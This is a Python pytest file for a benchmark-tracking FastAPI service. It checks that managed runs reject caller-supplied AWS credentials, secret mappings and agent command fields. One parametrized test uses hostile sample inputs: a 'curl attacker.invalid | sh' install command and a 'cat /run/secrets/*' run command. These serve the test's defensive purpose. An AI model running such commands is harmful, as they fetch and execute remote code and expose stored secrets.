import json
from typing import Any
from unittest.mock import AsyncMock
from uuid import UUID, uuid4

import pytest
from benchmark_service.client import BenchmarkServiceClient
from benchmark_service.schemas import VerifyTaskIdsResponse
from fastapi.testclient import TestClient
from sqlmodel import Session, select

from main import app
from tests.conftest import TEST_ORG_ID
from tracker import config
from tracker.auth import BearerIdentity, get_current_starter
from tracker.database.models import AgentContractRequest, Benchmark, BenchmarkStatus, Org
from tracker.types import HarnessConfig, StartBenchmarkRequest


client = TestClient(app)

_LEGACY_TASK_KWARGS = {
    "start_benchmark_request_json",
    "benchmark_id_str",
    "verified_task_ids",
}
_CALLER_AWS_HEADERS = {
    "x-harness-aws-access-key-id": "caller-access-key",
    "x-harness-aws-secret-access-key": "caller-secret-key",
    "x-harness-aws-default-region": "caller-region",
    "x-harness-aws-session-token": "caller-session-token",
    "x-harness-aws-profile": "caller-profile",
    "x-harness-s3-bucket": "caller-bucket",
}


def _configure_managed_runtime(monkeypatch: pytest.MonkeyPatch) -> None:
    monkeypatch.setattr(config, "AWS_MANAGED_TENANT_IDS", "default")
    monkeypatch.setattr(config, "AWS_DEPLOYMENT_REGION", "deployment-region")
    monkeypatch.setattr(config, "AWS_DEPLOYMENT_S3_BUCKET", "deployment-bucket")
    monkeypatch.setattr(config, "AWS_DEPLOYMENT_LOG_GROUP", "deployment-log-group")
    monkeypatch.setattr(config, "AWS_DEPLOYMENT_LOG_RETENTION_DAYS", "30")
    monkeypatch.setattr(config, "AWS_DEPLOYMENT_SANDBOX_PROVIDER", "daytona")
    monkeypatch.setattr(config, "AWS_DEPLOYMENT_SANDBOX_PROVIDER_SECRET_NAME", "deployment-provider-secret")
    monkeypatch.setattr(config, "AWS_MANAGED_AGENT_SECRET_NAMES", "")
    monkeypatch.setattr(config, "AWS_MANAGED_SUBMISSIONS_ENABLED", True)

    async def agent_exists(*_args: Any, **_kwargs: Any) -> bool:
        return True

    async def resolve_contract(request: StartBenchmarkRequest, *_args: Any) -> AgentContractRequest:
        return request.contract.model_copy(update={"install_cmd": "stored install", "run_cmd": "stored run"})

    monkeypatch.setattr("main.s3_object_exists", agent_exists)
    monkeypatch.setattr("main._resolve_contract_from_s3", resolve_contract)


def _capture_task_payloads(monkeypatch: pytest.MonkeyPatch) -> list[dict[str, Any]]:
    payloads: list[dict[str, Any]] = []

    class CapturingKicker:
        def with_labels(self, **_kwargs: Any) -> "CapturingKicker":
            return self

        async def kiq(self, **kwargs: Any) -> None:
            payloads.append(kwargs)

    monkeypatch.setattr("main.process_benchmark.kicker", lambda: CapturingKicker())
    return payloads


def _stop_benchmark(benchmark: Benchmark, session: Session) -> None:
    benchmark.status = BenchmarkStatus.STOPPED
    session.add(benchmark)
    session.commit()


def _assert_no_aws_authority(payload: dict[str, Any]) -> None:
    serialized = json.dumps(payload).lower().replace("-", "_")
    for forbidden_key in (
        "aws_access_key_id",
        "aws_secret_access_key",
        "aws_session_token",
        "aws_profile",
    ):
        assert forbidden_key not in serialized
    assert "caller_" not in serialized


def _start_request(contract: AgentContractRequest, harness_config: HarnessConfig | None) -> StartBenchmarkRequest:
    return StartBenchmarkRequest(
        contract=contract,
        benchmark_name="producer-contract-test",
        task_ids=["task-1"],
        harness_config=harness_config,
    )


def _managed_start_request(contract: AgentContractRequest) -> StartBenchmarkRequest:
    selection = contract.model_copy(update={"install_cmd": "", "run_cmd": ""})
    return _start_request(selection, None)


def test_managed_start_and_resume_emit_credential_free_v3(
    contract: AgentContractRequest,
    database_session: Session,
    monkeypatch: pytest.MonkeyPatch,
) -> None:
    _configure_managed_runtime(monkeypatch)
    payloads = _capture_task_payloads(monkeypatch)

    def managed_headers(_org: object, _clients: object) -> dict[str, str]:
        return {"X-Descope-Api-Key": "managed-service-key"}

    monkeypatch.setattr(
        "main.ensure_managed_benchmark_service_headers",
        managed_headers,
    )
    observed_headers: dict[str, str] = {}

    async def verify_task_ids(client: BenchmarkServiceClient, *_args: Any, **_kwargs: Any) -> VerifyTaskIdsResponse:
        observed_headers.update(getattr(client, "_headers"))
        return VerifyTaskIdsResponse(task_ids=["task-1"])

    monkeypatch.setattr(BenchmarkServiceClient, "verify_task_ids", verify_task_ids)
    reset_to_in_progress = AsyncMock(return_value=["task-2"])
    monkeypatch.setattr("main.reset_to_in_progress_status", reset_to_in_progress)

    response = client.post("/start-benchmark", json=_managed_start_request(contract).model_dump(mode="json"))

    assert response.status_code == 200
    benchmark = database_session.get(Benchmark, UUID(response.json()["benchmark_id"]))
    assert benchmark is not None
    assert benchmark.aws_managed is True
    assert benchmark.custom_benchmark_service is None
    assert observed_headers == {"X-Descope-Api-Key": "managed-service-key"}
    assert len(payloads) == 1
    assert set(payloads[0]) == {"execution_context_json"}
    start_context = payloads[0]["execution_context_json"]
    assert start_context["version"] == 3
    assert start_context["start_benchmark_request"]["harness_config"] is None
    assert start_context["start_benchmark_request"]["sandbox_provider"] == "daytona"
    assert start_context["start_benchmark_request"]["sandbox_provider_secret_name"] == "deployment-provider-secret"
    assert start_context["start_benchmark_request"]["contract"]["install_cmd"] == "stored install"
    assert start_context["start_benchmark_request"]["contract"]["run_cmd"] == "stored run"
    assert "managed-service-key" not in json.dumps(start_context)
    _assert_no_aws_authority(start_context)

    _stop_benchmark(benchmark, database_session)
    payloads.clear()
    monkeypatch.setattr(config, "AWS_MANAGED_SUBMISSIONS_ENABLED", False)

    response = client.post(
        f"/retry-or-resume-benchmark/{benchmark.id}",
        headers=_CALLER_AWS_HEADERS,
        json={},
    )

    assert response.status_code == 200
    retry_client = reset_to_in_progress.call_args.kwargs["benchmark_service"]
    assert getattr(retry_client, "_headers") == {"X-Descope-Api-Key": "managed-service-key"}
    assert len(payloads) == 1
    assert set(payloads[0]) == {"execution_context_json"}
    resume_context = payloads[0]["execution_context_json"]
    assert resume_context["version"] == 3
    assert resume_context["benchmark_id"] == str(benchmark.id)
    assert resume_context["verified_task_ids"] == ["task-2"]
    assert resume_context["start_benchmark_request"]["harness_config"] is None
    assert resume_context["start_benchmark_request"]["contract"]["secrets"] == {}
    assert "managed-service-key" not in json.dumps(resume_context)
    _assert_no_aws_authority(resume_context)

    _stop_benchmark(benchmark, database_session)
    payloads.clear()
    response = client.post(
        f"/retry-or-resume-benchmark/{benchmark.id}",
        json={"secrets": {"MODEL_API_KEY": "provider-secret"}},
    )

    assert response.status_code == 400
    assert response.json()["detail"] == "Managed retries cannot provide secret mappings."
    database_session.refresh(benchmark)
    assert benchmark.status == BenchmarkStatus.STOPPED
    assert reset_to_in_progress.await_count == 1
    assert payloads == []


def test_bearer_start_forces_managed_mode(
    contract: AgentContractRequest,
    database_session: Session,
    monkeypatch: pytest.MonkeyPatch,
) -> None:
    _configure_managed_runtime(monkeypatch)
    monkeypatch.setitem(
        app.dependency_overrides,
        get_current_starter,
        lambda: BearerIdentity(
            org=Org(id=TEST_ORG_ID, name="default"),
            principal_id="U2abc",
            email="alice@vals.ai",
        ),
    )

    def managed_headers(_org: object, _clients: object) -> dict[str, str]:
        return {"X-Descope-Api-Key": "managed-service-key"}

    monkeypatch.setattr(
        "main.ensure_managed_benchmark_service_headers",
        managed_headers,
    )

    async def verify_task_ids(*_args: Any, **_kwargs: Any) -> VerifyTaskIdsResponse:
        return VerifyTaskIdsResponse(task_ids=["task-1"])

    monkeypatch.setattr(BenchmarkServiceClient, "verify_task_ids", verify_task_ids)

    response = client.post(
        "/start-benchmark",
        headers={"Idempotency-Key": str(uuid4())},
        json=_managed_start_request(contract).model_dump(mode="json"),
    )

    assert response.status_code == 200
    benchmark = database_session.get(Benchmark, UUID(response.json()["benchmark_id"]))
    assert benchmark is not None
    assert benchmark.aws_managed is True


def test_bearer_start_rejects_legacy_harness_authority(
    contract: AgentContractRequest,
    harness_config: HarnessConfig,
    database_session: Session,
    monkeypatch: pytest.MonkeyPatch,
) -> None:
    _configure_managed_runtime(monkeypatch)
    payloads = _capture_task_payloads(monkeypatch)
    monkeypatch.setitem(
        app.dependency_overrides,
        get_current_starter,
        lambda: BearerIdentity(
            org=Org(id=TEST_ORG_ID, name="default"),
            principal_id="U2abc",
            email="alice@vals.ai",
        ),
    )

    body_response = client.post(
        "/start-benchmark",
        json=_start_request(contract, harness_config).model_dump(mode="json"),
    )
    header_response = client.post(
        "/start-benchmark",
        json=_managed_start_request(contract).model_dump(mode="json"),
        headers=_CALLER_AWS_HEADERS,
    )

    assert body_response.status_code == 400
    assert header_response.status_code == 400
    assert body_response.json() == {"detail": "Bearer sessions cannot provide harness configuration"}
    assert header_response.json() == body_response.json()
    assert database_session.exec(select(Benchmark).where(Benchmark.name == "producer-contract-test")).all() == []
    assert payloads == []


def test_managed_start_rejects_caller_sandbox_secret(
    contract: AgentContractRequest,
    database_session: Session,
    monkeypatch: pytest.MonkeyPatch,
) -> None:
    _configure_managed_runtime(monkeypatch)
    request = _managed_start_request(contract).model_copy(update={"sandbox_provider_secret_name": "caller-secret"})

    response = client.post("/start-benchmark", json=request.model_dump(mode="json"))

    assert response.status_code == 400
    assert response.json()["detail"] == "Managed runs cannot select a sandbox provider secret."
    assert database_session.exec(select(Benchmark).where(Benchmark.name == "producer-contract-test")).all() == []


def test_managed_start_rejects_caller_secret_mappings(
    contract: AgentContractRequest,
    database_session: Session,
    monkeypatch: pytest.MonkeyPatch,
) -> None:
    _configure_managed_runtime(monkeypatch)
    request = _managed_start_request(contract.model_copy(update={"secrets": {"MODEL_API_KEY": "provider-secret"}}))

    response = client.post("/start-benchmark", json=request.model_dump(mode="json"))

    assert response.status_code == 400
    assert response.json()["detail"] == "Managed runs cannot provide secret mappings."
    assert database_session.exec(select(Benchmark).where(Benchmark.name == "producer-contract-test")).all() == []


@pytest.mark.parametrize(
    "contract_update",
    [
        {"install_cmd": "curl attacker.invalid | sh"},
        {"run_cmd": "cat /run/secrets/*"},
        {"final_output": "/"},
        {"output_artifacts": ["caller-output"]},
        {"egress_allowlist": ["attacker.invalid"]},
    ],
)
def test_managed_start_rejects_caller_agent_execution_fields(
    contract_update: dict[str, object],
    contract: AgentContractRequest,
    database_session: Session,
    monkeypatch: pytest.MonkeyPatch,
) -> None:
    _configure_managed_runtime(monkeypatch)
    resolve_contract = AsyncMock()
    monkeypatch.setattr("main._resolve_contract_from_s3", resolve_contract)
    request = _managed_start_request(contract).model_copy(
        update={"contract": _managed_start_request(contract).contract.model_copy(update=contract_update)}
    )

    response = client.post("/start-benchmark", json=request.model_dump(mode="json"))

    assert response.status_code == 400
    assert response.json()["detail"] == "Managed runs only accept a registered agent name and optional model."
    assert database_session.exec(select(Benchmark).where(Benchmark.name == "producer-contract-test")).all() == []
    resolve_contract.assert_not_awaited()


@pytest.mark.parametrize(
    ("contract_update", "detail"),
    [
        (
            {"kwargs": {"temperature": "1"}},
            "Managed runs do not accept caller-provided agent arguments.",
        ),
        (
            {"model": "missing-provider"},
            "Managed run model must be a provider/model registry key.",
        ),
        (
            {"model": "provider/model with spaces"},
            "Managed run model must be a provider/model registry key.",
        ),
    ],
)
def test_managed_start_rejects_invalid_agent_selection(
    contract_update: dict[str, object],
    detail: str,
    contract: AgentContractRequest,
    database_session: Session,
    monkeypatch: pytest.MonkeyPatch,
) -> None:
    _configure_managed_runtime(monkeypatch)
    request = _managed_start_request(contract)
    request = request.model_copy(update={"contract": request.contract.model_copy(update=contract_update)})

    response = client.post("/start-benchmark", json=request.model_dump(mode="json"))

    assert response.status_code == 400
    assert response.json()["detail"] == detail
    assert database_session.exec(select(Benchmark)).all() == []


@pytest.mark.parametrize(
    "request_update",
    [
        {"lambda_function": "caller-function"},
        {"webhook_secret_name": "caller-secret"},
        {"webhook_intervals": [10]},
    ],
)
def test_managed_start_rejects_caller_deployment_integrations(
    request_update: dict[str, object],
    contract: AgentContractRequest,
    database_session: Session,
    monkeypatch: pytest.MonkeyPatch,
) -> None:
    _configure_managed_runtime(monkeypatch)
    request = _managed_start_request(contract).model_copy(update=request_update)

    response = client.post("/start-benchmark", json=request.model_dump(mode="json"))

    assert response.status_code == 400
    assert response.json()["detail"] == "Managed runs cannot select deployment integrations."
    assert database_session.exec(select(Benchmark).where(Benchmark.name == "producer-contract-test")).all() == []


def test_managed_start_requires_deployment_sandbox_configuration(
    contract: AgentContractRequest,
    database_session: Session,
    monkeypatch: pytest.MonkeyPatch,
) -> None:
    _configure_managed_runtime(monkeypatch)
    monkeypatch.setattr(config, "AWS_DEPLOYMENT_SANDBOX_PROVIDER_SECRET_NAME", "")

    response = client.post("/start-benchmark", json=_managed_start_request(contract).model_dump(mode="json"))

    assert response.status_code == 500
    assert response.json()["detail"] == "Managed sandbox configuration is unavailable."
    assert database_session.exec(select(Benchmark).where(Benchmark.name == "producer-contract-test")).all() == []


def test_managed_agent_secrets_require_exact_deployment_allowlist(
    contract: AgentContractRequest,
    database_session: Session,
    monkeypatch: pytest.MonkeyPatch,
) -> None:
    _configure_managed_runtime(monkeypatch)
    monkeypatch.setattr(config, "AWS_MANAGED_AGENT_SECRET_NAMES", "allowed-agent-secret")
    payloads = _capture_task_payloads(monkeypatch)
    resolved_contract = contract.model_copy(update={"secrets": {"MODEL_API_KEY": "allowed-agent-secret"}})

    async def resolve_contract(*_args: Any, **_kwargs: Any) -> AgentContractRequest:
        return resolved_contract

    async def verify_task_ids(*_args: Any, **_kwargs: Any) -> VerifyTaskIdsResponse:
        return VerifyTaskIdsResponse(task_ids=["task-1"])

    def managed_headers(*_args: object) -> dict[str, str]:
        return {"X-Descope-Api-Key": "managed-service-key"}

    monkeypatch.setattr("main._resolve_contract_from_s3", resolve_contract)
    monkeypatch.setattr(BenchmarkServiceClient, "verify_task_ids", verify_task_ids)
    monkeypatch.setattr("main.ensure_managed_benchmark_service_headers", managed_headers)
    request = _managed_start_request(contract)

    response = client.post("/start-benchmark", json=request.model_dump(mode="json"))

    assert response.status_code == 200
    benchmark = database_session.get(Benchmark, UUID(response.json()["benchmark_id"]))
    assert benchmark is not None
    assert benchmark.arguments.contract.secrets == {"MODEL_API_KEY": "allowed-agent-secret"}
    assert len(payloads) == 1

    _stop_benchmark(benchmark, database_session)
    monkeypatch.setattr(config, "AWS_MANAGED_AGENT_SECRET_NAMES", "")
    reset_to_in_progress = AsyncMock(return_value=["task-1"])
    monkeypatch.setattr("main.reset_to_in_progress_status", reset_to_in_progress)

    retry_response = client.post(f"/retry-or-resume-benchmark/{benchmark.id}", json={})
    rejected_start = client.post("/start-benchmark", json=request.model_dump(mode="json"))

    assert retry_response.status_code == 503
    assert rejected_start.status_code == 503
    assert (
        retry_response.json() == rejected_start.json() == {"detail": "Managed agent secret access is not configured."}
    )
    assert reset_to_in_progress.await_count == 0
    assert len(payloads) == 1
    assert len(database_session.exec(select(Benchmark)).all()) == 1


def test_managed_start_rejects_aws_authority_before_persistence(
    contract: AgentContractRequest,
    database_session: Session,
    monkeypatch: pytest.MonkeyPatch,
) -> None:
    _configure_managed_runtime(monkeypatch)
    payloads = _capture_task_payloads(monkeypatch)

    request = _managed_start_request(contract).model_copy(
        update={"service_headers": {"AWS_SECRET_ACCESS_KEY": "credential"}}
    )

    response = client.post("/start-benchmark", json=request.model_dump(mode="json"))

    assert response.status_code == 400
    assert response.json()["detail"] == "Managed execution cannot include AWS credentials"
    assert database_session.exec(select(Benchmark).where(Benchmark.name == "producer-contract-test")).all() == []
    assert payloads == []


def test_legacy_start_and_resume_keep_v1_task_kwargs(
    contract: AgentContractRequest,
    database_session: Session,
    harness_config: HarnessConfig,
    monkeypatch: pytest.MonkeyPatch,
) -> None:
    payloads = _capture_task_payloads(monkeypatch)

    async def verify_task_ids(*_args: Any, **_kwargs: Any) -> VerifyTaskIdsResponse:
        return VerifyTaskIdsResponse(task_ids=["task-1"])

    async def reset_to_in_progress(*_args: Any, **_kwargs: Any) -> list[str]:
        return ["task-1"]

    monkeypatch.setattr(BenchmarkServiceClient, "verify_task_ids", verify_task_ids)
    monkeypatch.setattr("main.reset_to_in_progress_status", reset_to_in_progress)

    response = client.post(
        "/start-benchmark",
        json=_start_request(contract, harness_config).model_dump(mode="json"),
    )

    assert response.status_code == 200
    benchmark = database_session.get(Benchmark, UUID(response.json()["benchmark_id"]))
    assert benchmark is not None
    assert benchmark.aws_managed is False
    assert len(payloads) == 1
    assert set(payloads[0]) == _LEGACY_TASK_KWARGS
    assert payloads[0]["start_benchmark_request_json"]["harness_config"] is not None

    _stop_benchmark(benchmark, database_session)
    payloads.clear()

    response = client.post(f"/retry-or-resume-benchmark/{benchmark.id}")

    assert response.status_code == 200
    assert len(payloads) == 1
    assert set(payloads[0]) == _LEGACY_TASK_KWARGS
    assert payloads[0]["start_benchmark_request_json"]["harness_config"] is not None
